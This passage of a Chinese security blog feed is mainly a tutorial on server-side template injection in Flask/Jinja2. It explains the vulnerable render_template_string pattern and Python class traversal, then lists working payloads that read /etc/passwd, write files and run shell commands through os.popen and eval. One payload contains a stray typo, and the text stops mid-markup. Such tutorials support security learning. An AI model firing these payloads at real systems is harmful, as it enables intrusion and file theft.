负载更少。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#延迟为5秒</span><span class="token function">ping</span> -n <span class="token number">6</span> <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="2021/lou-dong/ssti-mo-ban-zhu-ru/"/>
      <url>2021/lou-dong/ssti-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p><strong>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言</strong></p><h2 id="什么是模板引擎？"><a href="#什么是模板引擎？" class="headerlink" title="什么是模板引擎？"></a>什么是模板引擎？</h2><blockquote><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p><p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p></blockquote><h2 id="什么是服务端模板注入？"><a href="#什么是服务端模板注入？" class="headerlink" title="什么是服务端模板注入？"></a>什么是服务端模板注入？</h2><blockquote><p><strong>什么是模板？</strong></p><p>如今的开发已经形成了非常成熟的 MVC 的模式，我们的输入通过 V 接收，交给 C ，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做模板的技术，<strong>这种模板不只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言</strong>。</p><p><strong>服务端模板注入</strong></p><p>通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客的页面，登陆的时候可能会返回 “你好，+某某某的名字”。这个时候作者的名字可能就是通过身份信息渲染成html返回到页面</p></blockquote><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><h3 id="Router装饰器路由"><a href="#Router装饰器路由" class="headerlink" title="Router装饰器路由"></a>Router装饰器路由</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>  <span class="token comment"># route装饰器路由</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>告诉Flask什么样的URL能触发我们的函数. route()装饰器把一个函数绑定到对应的URL上，这句话相当于一个路由跟随一个函数，如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>"   <span class="token keyword">return</span> <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问127.0.0.1:5000/test会输出123</p><p>以下可以动态生成网页，如输入127.0.0.1:5000/hello/Mike</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/hello/&lt;username>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> <span class="token string">"Hello,%s"</span><span class="token operator">%</span>username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302105848587.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择调试模式，以便网页实时刷新。不然每次修改得重新Run</p><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p><strong>将模板名和你想作为关键字的参数传入模板的变量</strong></p><table><thead><tr><th align="center">函数</th><th align="center">用法</th></tr></thead><tbody><tr><td align="center">render_template</td><td align="center">渲染指定文件</td></tr><tr><td align="center">render_template_string</td><td align="center">渲染字符串</td></tr></tbody></table><p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p><pre class="line-numbers language-none"><code class="language-none">├── app.py  ├── static  │   └── style.css  └── templates      └── index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301203932344.png" alt="设置两个要进行渲染的参数"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301204034708.png" alt="在app.py进行渲染"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302104505677.png" alt="渲染结果"></p><h3 id="jinja2模板引擎特点"><a href="#jinja2模板引擎特点" class="headerlink" title="jinja2模板引擎特点"></a>jinja2模板引擎特点</h3><p><code>&#123;&#123;...&#125;&#125;</code>:装载一个变量，模板渲染的时候，会使用传进来的同名参数，这个变量的代表值被替换掉</p><p><code>&#123;%...%&#125;</code>:装载一个控制语句</p><p><code>&#123;#...#&#125;</code>:装载一个注释，模板渲染的时候会忽视这中间的值</p><h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><p>在templates下新建文件</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>&#123;&#123; title &#125;&#125; - TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello, &#123;&#123; user &#125;&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>app.py:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行：</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302122802280.png"></p><p>这里user变量已经可控了，能进行的只是传参，但不会引起代码执行。</p><p>原因在于我已经写了一个index.html模板，已经固定且被render_template渲染了。</p><p>所以模板渲染变得不可控了</p><p>而出现漏洞的原因为：<strong>大多数程序员为了省事不会专门去新建html文件，而是直接当字符串来渲染并且id是可控的。</strong>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    html <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;h3>%s&lt;/h3>    '''</span> <span class="token operator">%</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的 <code>id</code> 直接拼接进了 html 中，直接拼接 html 会存在反射型 xss，也存在RCE</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302150511343.png" alt="XSS"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302150211089.png" alt="RCE"></p><h3 id="Python特殊方法"><a href="#Python特殊方法" class="headerlink" title="Python特殊方法"></a>Python特殊方法</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p><p>每个类都有一个base属性</p><p><strong>我们在进行攻击的时候，虽然当前的类可能不能让我们进行很好的攻击，但是我们可以通过寻找其父类的其他子类，最后达到攻击的目的。</strong></p><p>如<code>print(&quot;&quot;.__class__.__bases__)</code>打印出来的空字符串的基类为object，其属性为str</p><p>并不只有bases可以找到基类<code>print(&quot;&quot;.__class__.__mro__)</code>可同时打印其基类和属性</p><table><thead><tr><th align="center">方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center"><code>__class__</code></td><td align="center">返回当前对象所属的类</td></tr><tr><td align="center"><code>__base__ &amp;&amp; __bases__</code></td><td align="center">返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类</td></tr><tr><td align="center"><code>__mro__</code></td><td align="center">以元组形式返回继承关系链</td></tr><tr><td align="center"><code>__globals__</code></td><td align="center">以dict形式返回函数所在模块命名空间中的所有变量</td></tr><tr><td align="center"><code>__subclasses__()</code></td><td align="center">以列表形式返回对象的子类</td></tr><tr><td align="center"><code>__dict__</code></td><td align="center">保存实列或对象实例的属性变量键值对字典</td></tr><tr><td align="center"><code>__init__</code></td><td align="center">初始化类</td></tr></tbody></table><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><blockquote><p>基本思路：利用python的魔术方法找到自己要用的函数</p><ul><li>确定模板引擎<ul><li>修改参数，看报错信息</li><li>看模板语法</li></ul></li><li>根据引擎寻找/构造payload<ul><li>构造payload的思路<ul><li>寻找可用对象（比如字符串、字典，或者已给出的对象）</li><li>通过可用对象寻找原生对象（object）</li><li>利用原生对象实例化目标对象（比如os）</li><li>执行代码</li></ul></li></ul></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302210113520.png" alt="所有子类"></p><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>使用魔术方法进行解析，再获取基本类：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">//</span>针对jinja2<span class="token operator">/</span>flask为<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取基本类后，继续向下获取基本类object的子类：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">object</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以使用一下模板控制语句寻找：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'os'</span> <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>loop<span class="token punctuation">.</span>index0 <span class="token operator">~</span><span class="token string">'_'</span><span class="token operator">~</span>c<span class="token punctuation">.</span>__name__<span class="token operator">~</span><span class="token string">'-'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">'-'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到重载过的init类（再初始化属性后，带wrapper的说明没有重载，找不带warpper的）</p><p>通过模板控制语句找可以利用的模块，或者builtins</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'___builtins_'</span> <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>loop<span class="token punctuation">.</span>index0 <span class="token operator">~</span><span class="token string">'_'</span><span class="token operator">~</span>c<span class="token punctuation">.</span>__name__<span class="token operator">~</span><span class="token string">'-'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">else</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">'-'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302212806473.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302213316451.png" alt="所有的内建函数"></p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302213832477.png" alt="命令执行"></p><h2 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">获得基类<span class="token comment">#python2.7</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#python3.7</span><span class="token string">''</span><span class="token punctuation">.</span>__。。。class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#python 2.7</span><span class="token comment">#文件操作</span><span class="token comment">#找到file类</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token comment">#读文件</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#写文件</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/tmp'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">#命令执行</span><span class="token comment">#os执行</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache下有os类，可以直接执行命令：<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#eval,impoer等全局函数</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__下有<span class="token builtin">eval</span>，<span class="token builtin">__import__</span>等的全局函数，可以利用此来执行命令：<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#python3.7</span><span class="token comment">#命令执行</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment">#文件操作</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token 